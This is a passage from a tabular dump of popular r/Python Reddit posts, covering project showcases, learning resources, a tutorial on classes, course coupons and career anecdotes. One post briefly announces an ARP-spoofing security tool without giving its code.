[source code](https://github.com/tjf801/oneliners/blob/master/snake.py)

edit: some bug fixes made it go over 3K chars",https://www.reddit.com/r/Python/comments/idxmnt/snake_game_in_a_single_line_of_python/,154,850
qcvvs6,Learning Python and found this great resource,"I am studying python algorithms and found this excellent resource. It covers many of the basic python algorithms that would be learned in an algorithm course, additionally more resources to conceptualize how to implement assignments in python such as quantum algorithms, project euler solutions, networking, machine learning solutions, graphics, and geodesy, digital image processing, ciphers, and cellular automata implemented in python.

Here is a link to the implementations:

https://github.com/TheAlgorithms/Python",https://www.reddit.com/r/Python/comments/qcvvs6/learning_python_and_found_this_great_resource/,21,850
cifyi7,I made an Inventory GUI,,https://imgur.com/e0CxJjv,33,853
gtgsot,Python performance comparison in my project's unittest (via Gitlab CI/CD),,https://i.redd.it/d433sa3ffx151.png,43,852
a6wufg,Python is now the programming language with most questions in StackOverFlow per month.,,https://insights.stackoverflow.com/trends?tags=java%2Cc%2Cc%2B%2B%2Cpython%2Cc%23%2Cvb.net%2Cjavascript%2Cassembly%2Cphp%2Cperl%2Cruby%2Cvb%2Cswift%2Cr%2Cobjective-c,106,853
7x7izl,I did a meme,,https://imgur.com/a/LOl46,116,850
12nxsop,"Google announces the list of 574 Python packages in its new ""Assured Open Source Software"" service",,https://cloud.google.com/assured-open-source-software/docs/supported-packages#python,106,848
uqabuy,Web Scraping with Python: Everything you need to know to get started (2022),,https://www.scrapingbee.com/blog/web-scraping-101-with-python/,43,845
eu5zb4,I wrote simple converter image to ascii(again?) and render it into picture.(source code in comments),,https://i.redd.it/jdb05fy174d41.png,51,853
v1rde4,What's a Python feature that is very powerful but not many people use or know about it?,,https://www.reddit.com/r/Python/comments/v1rde4/whats_a_python_feature_that_is_very_powerful_but/,505,847
u6bcgc,Why do people still pay and use matlab having python numpy and matplotlib?,,https://www.reddit.com/r/Python/comments/u6bcgc/why_do_people_still_pay_and_use_matlab_having/,286,851
3zv0p1,"""Learn Python"" Overtakes ""Learn Java"" on Google Trends",,https://dzone.com/articles/learn-python-overtakes-learn-java,118,847
k3awea,I have created a new Python package for web scraping and analysis of stock market data.,,https://pypi.org/project/marketools/,40,844
opeb83,Strange Attractors (My first package on pip),"I've just released a package in pypi for simulation and visualization of strange attractors like Lorenz, Chen, Aizawa, etc. I was fascinated by these mathematical marvels for a long time, and wanted to create a package so that more people can see their beauty. The package can create both plots and animations and also supports some themes. All plots and animations are created using matplotlib.

This animation is of Lorenz attractor with 6 initial points (theme = Flatland, could be heavily compressed on Reddit)

https://reddit.com/link/opeb83/video/6p4cujbberc71/player

PyPi package: [link](https://pypi.org/project/attractors/)

Source code: [link](https://github.com/Vignesh-Desmond/attractors)

Images: [Github link](https://github.com/Vignesh-Desmond/attractors/tree/main/imgs), [DeviantArt](https://www.deviantart.com/vigneshdesmond)

Since this is my first package, there might be some bugs and features lacking. Feel free to issue a pull request or raise an issue. Any suggestions are welcome.

>!P.S: The CLI currently only supports animations, I'll add plots very soon. Also the documentation is lacking, so I'm also adding it 😅.!<",https://www.reddit.com/r/Python/comments/opeb83/strange_attractors_my_first_package_on_pip/,16,844
11gvo6m,Python 3.12: A Game-Changer in Performance and Efficiency,,https://python.plainenglish.io/python-3-12-a-game-changer-in-performance-and-efficiency-8dfaaa1e744c,143,839
zqpnm5,Normally I teach Python as a CS professor. Now I’m developing a programming game where you can apply your Python skills to different coding challenges.,"Game-based learning is a great way to practice programming skills, if it is actually fun and a challenge. So I started developing a game / simulation, where my students could practice their Python skills in all kinds of environments (mostly robotics, abstract algo & ds problems, and some machine learning / image processing tasks).

Now for the last 18 months I’ve been developing this prototype into a proper game, that's hopefully useful and fun to a larger audience. I'm solo-developing this in my spare time, so it's still very much a work in progress. Please let me know what you think, you can find more details on the game’s Steam page: 

[https://store.steampowered.com/app/2216770/JOY\_OF\_PROGRAMMING\_\_Software\_Engineering\_Simulator](https://store.steampowered.com/app/2216770/JOY_OF_PROGRAMMING__Software_Engineering_Simulator)

Edit: Thank you so much for your interest. Since there are several request to join an early playtest you can sign up here: [https://prof-scherer.de/joy-of-programming/](https://prof-scherer.de/joy-of-programming/) I plan to start the next playtest sometime in January.",https://www.reddit.com/r/Python/comments/zqpnm5/normally_i_teach_python_as_a_cs_professor_now_im/,109,839
pawqhw,SQLModel: SQL DBs based on Python type hints. The biggest thing I've built since FastAPI and Typer. 😅,"I just released SQLModel ✨

[https://github.com/tiangolo/sqlmodel](https://github.com/tiangolo/sqlmodel)  


This is the biggest thing I've built since FastAPI and Typer... 😅  


SQLModel is a library for interacting with SQL DBs, based on Python type hints.

Each model is both a Pydantic and SQLAlchemy model, and it's all optimized for FastAPI. 🚀

More info in this Twitter thread: [https://twitter.com/tiangolo/status/1430252646968004612](https://twitter.com/tiangolo/status/1430252646968004612)

And the docs are here: [https://sqlmodel.tiangolo.com/](https://sqlmodel.tiangolo.com/)",https://www.reddit.com/r/Python/comments/pawqhw/sqlmodel_sql_dbs_based_on_python_type_hints_the/,152,839
p0ffe2,"I'm the author of Rich and Textual, two highly starred Python projects on Github. AMA","Rich has 27.K stars, and Textual has 1.5K.

I've released a new version of Textual, and I'm keen to get feedback, but feel free to AMA about any of my projects or Python development.

[https://github.com/willmcgugan/textual](https://github.com/willmcgugan/textual)

[https://github.com/willmcgugan/rich](https://github.com/willmcgugan/rich)

\--

**Thanks everyone**. Tweet [@willmcgugan](https://twitter.com/willmcgugan) if you have any more questions!",https://www.reddit.com/r/Python/comments/p0ffe2/im_the_author_of_rich_and_textual_two_highly/,113,844
75slcp,Python is the 2nd most popular language on GitHub,,https://i.imgur.com/KpbiDkV.png,84,842
b50i67,Used os and turtle to create visual file tree of system files (x86),,https://i.redd.it/fpovjx30e4o21.jpg,88,840
mkpifc,"How I Calculated the 1,000,000th Fibonacci Number with Python",,https://kushm.medium.com/how-i-calculated-the-1-000-000th-fibonacci-number-with-python-e921d3642dbf,100,834
id6dq7,I wrote a script to monitor COVID cases in a specific country and send travel recommendation to WhatsApp (less than 50 lines of Python),"Hey,

So one of my friends wanted to go to Japan, but he was worried about the COVID situation. He was checking the [number of confirmed cases](https://coronavirus.jhu.edu/map.html) daily to see when they start to go down. I decided to write a piece of Python code to automate it.

This is [the code](https://github.com/seamless-io/templates/tree/master/monitor_country_covid_status). It turned out to be less than 50 lines.

And this is [this blog post](https://medium.com/seamless-cloud/monitor-covid-cases-using-python-in-less-than-50-lines-of-code-810e9b7ab56c) with a more detailed explanation of the code.

Disclaimer: I'm the creator of one of the services mentioned in the blog post (https://www.seamlesscloud.io/). But the code is just Python so you can use it however you want.",https://www.reddit.com/r/Python/comments/id6dq7/i_wrote_a_script_to_monitor_covid_cases_in_a/,71,842
9nxnm7,Looking for educational images,,https://i.redd.it/le2rlwe3z0s11.jpg,62,835
6n9kbj,"100 Python books, categorized and ranked",,http://pythonbooks.org/,44,843
b8xk3a,I wrote a Python package to do adaptive sampling of functions in parallel [OC],,https://i.redd.it/urzt7b3aq1q21.gif,49,834
11ts1qq,Why use classes?,"*I originally wrote this piece as an answer to a question on the* [*learnpython reddit*](https://www.reddit.com/r/learnpython/comments/11sebbg/been_using_python_for_3_years_never_used_a_class/?utm_source=share&utm_medium=web2x&context=3)*, and it was suggested that it would be a useful learning resource for many people who struggle with* ***why*** *we use classes rather than just variables and functions.  So here it is:*

# Why use classes?

**My ""Ah ha!"" moment for understanding classes was understanding that a** ***class*** **creates** ***objects*** **and defines the** ***type*** **of** ***object.***

Time for an example:

Say that we're writing a game, and we need to define certain things about the player:

    player_name = ""James""
    player_level = ""novice""

We also need to keep track of the player's score:

    player_score = 0

We may also need to save each of the player's moves:

    player_moves = [move1, move2, move3]

and now we need to be able to increase the player's score when they win some points, and to add their last move to their list of moves. We can do this with a function:

    def win_points (points, move):
        player_score += points
        player_moves.append(move)

&#x200B;

That's all fine so far. We have some global variables to hold the player's data, and a function to handle the results of a win, and all without writing any classes.

Now say that we need to add another player. We will need to repeat all of the above but with unique identities so that we can distinguish player\_1 from player\_2:

    player1_name = ""<name>""
    player1_level = ""novice""
    player1_score = 0
    player1_moves = [move1, move2, move3]
    
    player2_name = ""<name>""
    player2_level = ""novice""
    player2_score = 0
    player2_moves = [move1, move2, move3]
    
    def win_points (player_name, points, move):
        if player_name == player1_name:
            player1_score += points
            player1_moves.append(move)
        else:
            player2_score += points
            playe2_moves.append(move)

Still not too bad, but what if we have 4 players, or 10, or more?

It would be better if we could make some kind of generic ""player"" data structure that can be reused for as many players as we need. Fortunately we can do that in Python:

We can write a kind of ""template"" / ""blueprint"" to define all of the attributes of a generic player and define each of the functions that are relevant to a player. This ""template"" is called a ""Class"", and the class's functions are called ""methods"".

    class Player():
        def __init__(self, name):
            """"""Initialise the player's attributes.""""""
            self.name = name
            self.level = 'novice'
            self.score = 0
            self.moves = []
    
        def win_points(self, points, move):
            """"""Update player on winning points.""""""
            self.score += points
            self.moves.append(move)

Now we can create as many players (""player objects"") as we like as *instances* of the *Player class*.

To create a new player (a ""player object"") we need to supply the Player class with a name for the player (because the initialisation function \_\_init\_\_() has an argument ""name"" which must be supplied). So we can create multiple *Player* objects like this:

    player1 = Player('James')
    player2 = Player('Joe')
    player3 = Player('Fred')

Don't overthink the `self` arguments. The self argument just means ""the specific class object that we are working with"". For example, if we are referring to *player1*, then self means ""the player1 object"".

To run the `Player.win_points()` method (the `win_points()` function in the class `Player`) for, say player3:

    player3.win_points(4, (0, 1)) # Fred wins 4 points, move is tuple (0, 1)

and we can access Fred's other attributes, such as Fred's player's name, or  last move, from the Player object:

    print(player3.name)  # prints ""Fred""
    # Get Fred's last move
    try:
        last_move = player3.moves[-1]
    except IndexError:
        print('No moves made.')

Using a Class allows us to create as many ""Player"" type objects as we like, without having to duplicate loads of code.

Finally, if we look at the type of any of the players,  we see that they are instances of the class ""Player"":

    print(type(player1))  # prints ""<class '__main__.Player'>""

I hope you found this  post useful.",https://www.reddit.com/r/Python/comments/11ts1qq/why_use_classes/,135,834
jzlb1w,"I made a video for my students explaining our recent end-to-end ML project (from data source to live website). Thought you folks might find it useful. Please let me know if anything’s confusing, incorrect, or could be done better!",,https://youtu.be/Q6j5UVc2akQ,24,831
mo4ue0,I wrote my first python+flask web app 😊! Mood-based playlist generator and analyzer (Spotify).,"It has begun as a small Spotify api testing thing. I have tried to figure out how these api http requests work and decided to go for the sportify api. Which, I have to say isn’t very beginner friendly. However, after roughly 6 months of working on it, I finally did it and I released a working draft on [Heroku](https://marcify.herokuapp.com).

https://preview.redd.it/dke43y62ncs61.png?width=852&format=png&auto=webp&s=4b2df3d4f9c966f11e1be5ecccd1caf6b8319903

https://preview.redd.it/937a6uavmcs61.png?width=1067&format=png&auto=webp&s=6f8309ecd61a850e7674ca61825d92d743ae7dd2

I am absolutely happy about my result, because I have never thought it would be possible for me. I started my python journey 1.5 years ago. I don’t have that much time, but I try to spend as much as I can to learn something new regarding Python. This particular project here helped me a lot to understand api calls and http request methods and improved my very little knowledge about html and css. I also did an online beginner course in JavaScript. The JS part was the most time-consuming part for me and mostly done by trial and error.

The source code is available on [GitHub](https://github.com/marwonn/spotify-playlist-generator-analyzer).

Since I started learning Python I have been just a reader of this reddit group, but it is absolutely great what super useful insights one can get here. Thanks to the community!

Cheers

\*\*\*Edit on 2021/04/13\*\*\*

Thanks to all of you for your overwhelming feedback!! I highly appreciate it and it is really, really motivating me to keep going with my Python journey.",https://www.reddit.com/r/Python/comments/mo4ue0/i_wrote_my_first_pythonflask_web_app_moodbased/,30,838
jp8yze,Our bot scraps Udemy Coupons and then automatically enrolls you to those paid courses for FREE.,"There was a post about it last month [here](https://www.reddit.com/r/Python/comments/izrjbc/i_made_a_python_bot_that_scrapes_udemy_coupons/) and since then we've massively improved the code. 

We've added reusable code, fixed browsers (well, firefox still needs a manual intervention), streamlined the process to be interactive in the terminal, introduced partial CI/CD via github action, integrated styling bot, started using a package manager (Poetry), fixed the zip code issue, and made some more changes which will make it easier to contribute (cleaning up README massively comes to mind, it previously used HTML).

Hope you will like the project, the code is [here](https://github.com/aapatre/Automatic-Udemy-Course-Enroller-GET-PAID-UDEMY-COURSES-for-FREE).",https://www.reddit.com/r/Python/comments/jp8yze/our_bot_scraps_udemy_coupons_and_then/,43,833
htx7w3,My Third PyGame Project: The Breakout,,https://v.redd.it/rmdyh738xrb51,35,839
cemtlr,I feel so valued,"Today my coworker asked me to help him with something.  Basically, we had a bunch of gift cards that were supposed to be for employee giveaways, but they were all about to expire. We had about 100 of them.  These gift cards were only redeemable as a guest user so we couldn't just log in to the website and load them all into one user.  We had to perform a separate order for every single gift card.  The worst part is none of the form data was saving in my browser either, so I had to fill in the shipping information manually.  The whole order process took 5 minutes per card.  If done manually, that is..

&#x200B;

I've never used selenium before but I figured this was literally the perfect task, since the orders were all the same save for the gift card codes.  I told my coworker to just help me type out all the codes into a text file and told him I would take it from there.  20 minutes later I had written up a selenium script that ran through the list of codes and performed the orders.  I let the script run for about 15 minutes and we were done!  

&#x200B;

Easily a 2 hour task for two people done in 40 minutes by one! Thanks python.",https://www.reddit.com/r/Python/comments/cemtlr/i_feel_so_valued/,66,833
t6njyc,I use single quotes because I hate pressing the shift key.,"Trivial opinion day . . .

I wrote a lot of C (I'm old), where double quotes are required.  That's a lot of shift key pressing through a lot of years of creating and later fixing Y2K bugs.  What a gift it was when I started writing Python, and realized I don't have to press that shift key anymore.

Thank you, Python, for saving my left pinky.",https://www.reddit.com/r/Python/comments/t6njyc/i_use_single_quotes_because_i_hate_pressing_the/,272,828
k7u8a0,"I made an ARP Cache Poisoning tool that automatically sets up a Man-in-the-middle attack on a target host, intercepting its internet traffic. It only uses Python 3.x built-in libraries.","Initiating a Man-in-the-middle (MitM) attack usually requires setting up information on the target host and gateway, as well as executing the attack against each one individually. On top of that, doing this in Python is often portrayed as requiring third-party libraries in many books and tutorials out there.

This tool makes exclusive use of built-in Python 3.x libraries and automatically reads all the information required to initiate the attack, requesting from the user nothing but the target's IP address (as long as it belongs to the same network segment as the attacker, as is the case of any ARP spoofing attack).

Use this tool to assess the security controls implemented on your own networks, test Intrusion Detection Systems you may have set up or simply expand your knowledge on cybersecurity and Python programming in general.

This is a continuation of the building of a pure-Python tool set I announced previously with my [Network Packet Sniffer](https://github.com/EONRaider/Packet-Sniffer). This time we make use of design patterns such as command and proxy, query networking information from kernel routing tables and perform the usual operations with ctypes.

The code is available on GitHub and open to pull requests. Make good use.

[https://github.com/EONRaider/Arp-Spoofer](https://github.com/EONRaider/Arp-Spoofer)",https://www.reddit.com/r/Python/comments/k7u8a0/i_made_an_arp_cache_poisoning_tool_that/,37,831
g32ig1,Animated depth estimation from monocular image,,https://gfycat.com/silentcanineborderterrier-estimation-tensorflow-monocular-estimate-machine,15,830
ovth3f,"""Automate the Boring Stuff with Python"" online course is free to sign up for the next few days with code AUG2021FREE","https://inventwithpython.com/automateudemy (This link will automatically redirect you to the latest discount code.)

You can also click this link or manually enter the code: AUG2020FREE (uh, I forgot what year it was and it doesn't let me change it: the code is 2020 not 2021)

https://www.udemy.com/course/automate/?couponCode=AUG2020FREE

This promo code works until the 4th (I can't extend it past that). Sometimes it takes an hour or so for the code to become active just after I create it, so if it doesn't work, go ahead and try again a while later. I'll change it to AUG2021FREE2 in three days.

**I'm also working on another Udemy course** that follows my recent book ""Beyond the Basic Stuff with Python"". So far I have the first 15 of the planned 56 videos done. You can watch them for free on YouTube:

https://www.youtube.com/watch?v=kSrnLbioN6w&list=PL0-84-yl1fUmeV_2bBSguF_S0TVZk8wow&index=1

Udemy has changed their coupon policies, and I'm now only allowed to make 3 coupon codes each month with several restrictions. Hence why each code only lasts 3 days. **I won't be able to make codes after this period**, but I will be making free codes next month. [Meanwhile, the first 15 of the course's 50 videos are free on YouTube.](https://www.youtube.com/watch?v=1F_OgqRuSdI&list=PL0-84-yl1fUnRuXGFe_F7qSH1LEnn9LkW)

Side note: My latest book, [The Big Book of Small Python Projects](https://inventwithpython.com/bigbookpython/), is out. It's a collection of short but complete games, animations, simulations, and other programming projects. They're more than code snippets, but also simple enough for beginners/intermediates to read the source code of to figure out how they work. The book is released under a Creative Commons license, so it's free to read online. (I'll be uploading it this week when I get the time.) The projects come from this [git repo](https://github.com/asweigart/pythonstdiogames).

**Frequently Asked Questions:** (*read this before posting questions*)

* This course is for beginners and assumes no previous programming experience, but the second half is useful for experienced programmers who want to learn about various third-party Python modules.
* If you don't have time to take the course now, that's fine. Signing up gives you lifetime access so you can work on it at your own pace.
* This Udemy course covers roughly the same content as the 1st edition book (the book has a little bit more, but all the basics are covered in the online course), which you can read for free online at https://inventwithpython.com
* The 2nd edition of Automate the Boring Stuff with Python is free online: https://automatetheboringstuff.com/2e/
* I do plan on updating the Udemy course for the second edition, but it'll take a while because I have other book projects I'm working on. If you sign up for this Udemy course, you'll get the updated content automatically once I finish it. It won't be a separate course.
* It's totally fine to start on the first edition and then read the second edition later. I'll be writing a blog post to guide first edition readers to the parts of the second edition they should read.
* I wrote a blog post to cover [what's new in the second edition](https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/)
* **You're not too old to learn to code. You don't need to be ""good at math"" to be good at coding.**
* Signing up is the first step. Actually finishing the course is the next. :) [There are several ways to get/stay motivated.](https://www.reddit.com/r/learnprogramming/wiki/faq#wiki_how_can_i_get.2Fstay_motivated_to_learn_programming.3F) I suggest getting a ""gym buddy"" to learn with. Check out /r/ProgrammingBuddies",https://www.reddit.com/r/Python/comments/ovth3f/automate_the_boring_stuff_with_python_online/,69,834
b7oizi,I made a download bar in terminal with Python!,,https://v.redd.it/7036e2gkvgp21,47,833
bklroc,Why I'm not collaborating with Kenneth Reitz,,https://vorpus.org/blog/why-im-not-collaborating-with-kenneth-reitz/,246,833
avnpue,First time coding anything other than HTML on my first day at university (Except the cls function),,https://i.redd.it/bkol9biz39j21.jpg,185,828
vtiz4o,Python is the 2nd most demanded programming language in 2022,,https://www.devjobsscanner.com/blog/top-8-most-demanded-languages-in-2022/,133,823
kisczb,"We Downloaded 10,000,000 Jupyter Notebooks From Github – This Is What We Learned",,https://blog.jetbrains.com/datalore/2020/12/17/we-downloaded-10-000-000-jupyter-notebooks-from-github-this-is-what-we-learned/,104,828
5fqln4,"In case of fire, light a fire.",,https://imgur.com/a/VAIJl,115,823
11syxd0,The Ruff python linter is insanely good,"I just migrated some of my projects over to using [ruff](https://github.com/charliermarsh/ruff), and I am EXTREMELY impressed. It is quite literally 100 times faster than my previous linting configuration, all while being more organized and powerful. It's mind boggling fast. It has all of the plugins builtin that I was previously using with tools like flake8. It hooks into `pre-commit` and replaces many plugins I had before like:

* `isort` - sorts imports
* `bandit` - finds common security issues
* `flake8` - linter; additional benefit is that I can now delete my \`.flake8\` file.
* `pygrep-hooks` - common misc linting

Additionally, it's completely configurable via pyproject.toml, so that always feels good.

By the way, if you want to checkout my python template, it has my preferred ruff configuration:[https://github.com/BrianPugh/python-template](https://github.com/BrianPugh/python-template)",https://www.reddit.com/r/Python/comments/11syxd0/the_ruff_python_linter_is_insanely_good/,136,826
6wmsbq,Python has clearly overtaken Java in popularity on StackOverflow and trails only JavaScript,,https://insights.stackoverflow.com/trends?utm_source=so-owned&utm_medium=blog&utm_campaign=trends&utm_content=blog-link&tags=java%2Cpython%2Cphp%2Cjavascript,111,826
dcbnie,Made this coz bored... matplotlib is true love.,,https://v.redd.it/95uflz8aa5q31,103,828
9nc6ee,Python crashed my computer (shitpost),,https://v.redd.it/gletf2watjr11,69,824
9x1smv,"I created a python module for command line checkboxes, better yes/no or number input.",,https://i.redd.it/h4tudg0lsby11.gif,55,823
xyyj9t,"If you're a beginner interested in data science and machine learning, I recently produced a video series that goes through all of the major algorithms and their implementations in Python! I put a lot of work into each tutorial, so hopefully this helps out!",,https://youtube.com/playlist?list=PLvICEeb-TZEHKkojcv1_POKPrCwlsEnsI,32,821
35abd2,Ubuntu plans to switch to Python3 by default for the 16.04 release.,,http://www.phoronix.com/scan.php?page=news_item&px=Ubuntu-16.04-Python-Plans,272,824
gr4jjn,"Kroger CLI, automation utility to save on shopping, earn points, get purchases summary and more",,https://v.redd.it/m4sby7p116151,65,822
pjffa8,"Hi, I made a python script that changes your desktop wallpaper depending on the weather.","I used python to make this script quite a while ago and had only added it to GitHub recently. Anyways, it's quite straight forward, a script that uses a weather API to change your desktop wallpaper. 

&#x200B;

https://preview.redd.it/linebrkk80m71.jpg?width=3936&format=pjpg&auto=webp&s=c123eb811f47bb75837306d50b9c1832441a8f19

Check out the repo: [here](https://github.com/yangman946/WallPaperChanger)

Feel free to give thoughts or feedback.",https://www.reddit.com/r/Python/comments/pjffa8/hi_i_made_a_python_script_that_changes_your/,65,820
ovjubg,What's the most simple & elegant piece of Python code you've seen?,"For me, it's `someList[::-1]` which returns `someList` in reverse order.",https://www.reddit.com/r/Python/comments/ovjubg/whats_the_most_simple_elegant_piece_of_python/,317,817
n6wt6y,Do you also use the python console and the python math libraries as a calculator?,I just want to know if anyone else does it,https://www.reddit.com/r/Python/comments/n6wt6y/do_you_also_use_the_python_console_and_the_python/,174,811
n3rapc,Beginner to pro in Python [List of free resources],,https://devwriteups.com/beginner-to-pro-in-python-with-these-free-resources?guid=fd4fba1f-48a4-4371-a743-54f1a60b7d8a&deviceId=530f3979-b7c0-469e-9a46-7b87fec84ee2,28,813
a2z1si,I would like to share an small personal project in Python,"I was working in a small personal project, a text based video player for terminal using ascii chars, leave me an star in GitHub if you like [https://github.com/joelibaceta/video-to-ascii](https://github.com/joelibaceta/video-to-ascii)

&#x200B;

[Demo](https://reddit.com/link/a2z1si/video/kct37vmu68221/player)",https://www.reddit.com/r/Python/comments/a2z1si/i_would_like_to_share_an_small_personal_project/,92,814
mz07m7,What routine tasks do you automate with python programs?,"A similar question was posted [here](https://www.reddit.com/r/Python/comments/70udwq/what_routine_tasks_do_you_automate_with_programs/) on  Monday, 18 September 2017. It was nearly 3.5 years ago, so I'm curious how people are using their python skills to automate their work. I automated a Twitter bot last year and it crossed 9000 followers today.

So, tell me your story, and don't forget to add the GitHub repo link if your code is open source. Have a great day :)",https://www.reddit.com/r/Python/comments/mz07m7/what_routine_tasks_do_you_automate_with_python/,294,820
bzzphl,I'm trying to see what's the coolest looking/most satisfying thing I can render in Python. Here's what I came up so far.,,https://v.redd.it/181a3nus21431,30,815
f4oaag,"Bank statement analyzer GUI with pandas, matplotlib and PyQt5",,https://i.redd.it/133j2mxb59h41.png,93,814
d79phm,Animated Fast Fourier Transform of Music Piece,,https://v.redd.it/15cm4yaquxn31,82,811
i7xb5f,A Python App with modern GUI,"Good day y'all,

Im a 15 year old Python dev and I've just finished building my first major Python project with UI. I tinkered a lot with tKinter (pun almost unintended) and even tried PyQT5. Both of these are time consuming to work with and tKinter's GUI looks like it shouldve been abandoned in 2005. Thats when my quest of finding an easy and modern looking UI Library started. And then I found Python Eel. Eel isnt a GUI Library like tKinter, but it can help link up python as backend with HTML/ CSS as the front. I didn't really know HTML and CSS a lot, but it was fairly easy. My project is at [https://github.com/JeswinSunsi/PentyDesktopAssistant](https://github.com/JeswinSunsi/PentyDesktopAssistant) . It has a bit of Spaghetti code, but its pretty neat. I would appreciate it if you guys could check it out and give a review. Also, star it if you can ;)

Thankss.  


Edit: After a lot of people told me, I gave another look into PyQt. Although I would still have designed Penty with Eel, PyQt actually doesn't seem too hard, that is, after the sorta steep learning curve. But once you've mastered the basics, it'd be way more readable and easier.

Edit 2: I never expected this post to get these many upvotes and positive comments. Thanks to everyone, y'all made my day! Also, you can PM me here if you have any doubts or want to tell me anything related to Python, I'll try my best to reply to everyone. Cheers!",https://www.reddit.com/r/Python/comments/i7xb5f/a_python_app_with_modern_gui/,174,808
ulaj4a,I'm too lazy to turn off my PC at nights. so made an app to turn it off with my phone,"
""Laziness"" is a common problem in programmers :D

Personally most of the nights, when I end up coding and go to bed, or go to watch Better call Saul on TV ( it's awesome ) I won't shut down my PC because I am a lazy person

I'm pretty sure most of you have same problem :)

So, to solve this and help the environment and reducing the energy consuming I wrote this little Django script.

This mini-web give you the power of shutting down your linux PC from your phone just with one single click :D

I called it LazyHelper🦥

Published here:
https://github.com/mehdiirh/LazyHelper",https://www.reddit.com/r/Python/comments/ulaj4a/im_too_lazy_to_turn_off_my_pc_at_nights_so_made/,196,813
o8uw5a,I created a video about how you can train a neural network (in python) to learn complex image/video classification tasks (like in-game detection) using transfer learning! The GitHub repo is linked in the video description. Hope this is useful or helpful for some of you guys :-),,https://youtu.be/TsAinKh8TRw,18,809
n332zn,"I landed a junior position coding in Python, I'm so excited and I'd LOVE advice","Bit o' background: While I've always loved computers and dabbled with web dev as a kid, I recently (6ish months?) started coding again hardcore. I had just had a business fail, money was tight as shit, debt to our eyeballs... and I wanted to start again with one of my oldest passions that I'd always been afraid to pursue. So I hunkered down and got into Python, because I remembered liking the language. 

I pretty quickly got a job in non-Python web dev (Angular and Node.Js, which I was competent enough in thanks to dabbling) but it was awful. Barely over minimum wage, and despite being very junior I was expected to manage an entire code base and servers and essentially everything techy. So I did the best I could, kept working on my Python projects in my free time, and kept applying to new positions.

Eventually a recruiter took a liking to me, and got me some interviews for Python positions. One I totally bombed, but the other two actually ended in two very enthusiastic offers. I ended up being offered more than I'd even asked for, way more than I expected as a Junior. I took the offer and put in my notice at my old job, which ended this past Friday.

I just can't express how excited I am to have this opportunity, the company culture seems amazing, I'll be able to get out of debt, I'll have room to grow and learn and thrive... on one hand I couldn't have done it without reddit communities guiding me (hi, cscareerquestions and learnpython) and on the other hand I'm just so damn proud.

Anyways, I start on the 17th. I'm half sharing because I'm just really excited, but also, if anyone has advice for starting in a junior role with a huge company, I'd love to hear it. I want to give this my best shot. Thanks, y'all.",https://www.reddit.com/r/Python/comments/n332zn/i_landed_a_junior_position_coding_in_python_im_so/,94,810
mvz1no,Yeethon - Python but recompiled with yeet,"Following a discussion in the Python discord server about the rust community wanting to add `yeet` as a reserved keyword, I decided to make this into an actual thing in Python. Python is great in that it's actually pretty simple to change its grammar once you know how to do so (editing the .gram file and regenerating a couple of files with `make regen-pegen`), after which you can recompile and voila, you have new grammar. In this case, I turned the `del` keyword into yeet, meaning you can write code like this:

&#x200B;

https://preview.redd.it/1vaacp4d8ou61.png?width=644&format=png&auto=webp&s=00551e90d20c101b776883b8a45b7854c3c4f19b

I hope this interests anyone, enjoy yeethon!  
p.s. You can find the repo for yeethon at https://github.com/Yeethon/cyeethon  
",https://www.reddit.com/r/Python/comments/mvz1no/yeethon_python_but_recompiled_with_yeet/,68,811
basnhi,Python programmers of reddit: what's the most useful tiny little efficiency you've discovered that's improved your programming hugely?,"Whether it's default dicts, enumerate, a way to combine functions really efficiently, or whatever, what's the best tiny trick you've discovered that's improved your code massively?",https://www.reddit.com/r/Python/comments/basnhi/python_programmers_of_reddit_whats_the_most/,560,804
n96kk0,100 Helpful Python Tips You Can Learn Before Finishing Your Morning Coffee,,https://towardsdatascience.com/100-helpful-python-tips-you-can-learn-before-finishing-your-morning-coffee-eb9c39e68958?sk=ae2d0a3231d090ff7b986bfd27ebac0f,96,805
7mo2l8,Turtle module drawing a randomised landscape,,https://i.redd.it/1zw2qzsy8p601.gif,40,802
mhrh1i,Datetime changes in Python 4,,https://kosgd.medium.com/datetime-changes-in-python-4-0-474045337b99,106,802
krmqiu,"I built a framework to stream from Kodi, Netflix, Amazon, and Youtube with your voice","## TL;DR: just gimme the gist:

The project: [https://gitlab.com/danielquinn/majel](https://gitlab.com/danielquinn/majel)

The demo:

[Reddit recompressed this video for optimal potato quality.  If you want a better version, have a look a the video in the repo.](https://reddit.com/link/krmqiu/video/pai4g8w1ep961/player)

Over the last year I've been working on a side project that leverages [Mycroft](https://mycroft.ai) (think: Alexa, but open-source and privacy-friendly) to do exciting things like stream video from Netflix, Amazon, and Youtube, or dig through your bookmarks for recipes etc.  It's finally in a state that I'm comfortable sharing with you all, [so here its](https://gitlab.com/danielquinn/majel).  I've named it *""Majel""* for [Majel Barrett-Roddenberry](https://en.wikipedia.org/wiki/Majel_Barrett), a reference that'll make sense if you're a Trekkie.

## Some technical notes about the architecture if you're interested:

[Architecture diagram](https://preview.redd.it/ypm0jjv5ep961.png?width=1670&format=png&auto=webp&s=79ac6127afe9b3b87f863c6fb12844b28d21a319)

Majel sits on top of Mycroft.ai's voice activation system as a set of three (at the moment anyway) ""skills"" that know what to do when certain voice commands are issued.  These skills do a little research around what a command might mean -- For example you could say: `""play the west wing""`, the `streamer-skill` will figure out where you're most likely to find [The West Wing](https://www.imdb.com/title/tt0200276/) (including your local `.mkv` files) and then push the location of the stream into Mycroft's [message bus framework](https://mycroft-ai.gitbook.io/docs/mycroft-technologies/mycroft-core/message-bus) and exit.

The other part of the equation is the `majel` program that just listens for these messages and then executes different processes based on what comes down the pipe.  If it gets a Netflix or Amazon URL for example, it'll point your browser (using Selenium) to the stream in question and ""click"" the play button, if it's a local file, it'll play it with MPV (thanks to `python-mpv`), etc.

Anyway, I'm really happy with how it's turned out and wanted to share.  It's licensed under the [AGPL](https://en.wikipedia.org/wiki/GNU_Affero_General_Public_License), so contributions are always welcome and I've designed it to be very pluggable so I'm hoping to extend it to do some more stuff later: search Google/DuckDuckGo for arbitrary stuff, dig up products on Amazon, and (if I can figure out a smart way to do it) video-call my parents.",https://www.reddit.com/r/Python/comments/krmqiu/i_built_a_framework_to_stream_from_kodi_netflix/,58,801
6ozf9d,"The 2017 Top Programming Languages: Python jumps to No. 1, and Swift enters the Top Ten",,http://spectrum.ieee.org/computing/software/the-2017-top-programming-languages,120,799
q6stpy,IT denied my request for python at work,"EDIT: A couple months after this incident I started applying for python developer roles and I found a job just 2 months ago paying 40% more with work I really enjoy.


